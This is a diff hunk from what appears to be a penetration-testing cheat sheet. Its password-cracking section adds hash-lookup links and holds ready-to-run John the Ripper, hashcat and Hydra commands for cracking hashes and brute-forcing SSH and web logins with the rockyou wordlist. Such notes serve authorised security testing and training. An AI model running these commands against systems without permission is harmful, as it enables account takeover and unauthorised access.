@@ -149,14 +149,16 @@ https://hackersonlineclub.com/sql-injection-cheatsheet/
 CRACKING PASSWORDS
 ...................
 
+https://hashes.com/en/decrypt/hash
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
 john -wordlist /path/to/wordlist -format=[FORMATO] -users=users.txt hashfile
 
-
-HYDRA
-......
-
 hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22
+
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 
 Replace "ssh" with any service name
 
